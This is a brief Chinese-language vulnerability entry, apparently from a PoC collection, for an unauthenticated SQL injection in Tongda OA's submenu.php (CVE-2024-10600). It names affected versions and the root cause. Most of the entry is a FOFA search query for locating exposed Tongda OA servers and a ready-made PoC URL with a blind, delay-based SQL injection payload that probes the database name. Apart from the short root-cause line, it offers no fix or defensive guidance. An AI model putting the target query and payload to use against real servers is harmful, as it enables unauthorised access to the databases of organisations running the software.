# 通达OA前台submenu.php存在SQL注入漏洞(CVE-2024-10600)

pda/appcenter/submenu.php 未包含inc/auth.inc.php且 $appid 参数未用'包裹导致前台SQL注入

## 影响范围

v2017-v11.6

## fofa

```javascript
app="TDXK-通达OA" && icon_hash="-759108386"
```

## poc

```javascript
http://192.168.0.106/pda/appcenter/submenu.php?appid=1%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```

![53147e26ebbc31217d5db726977a1f4f](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411101147145.png)



## 漏洞来源

- https://github.com/LvZCh/td/issues/3
- https://mp.weixin.qq.com/s/TL1QWIpSpnrqcJ4rTXTTdQ
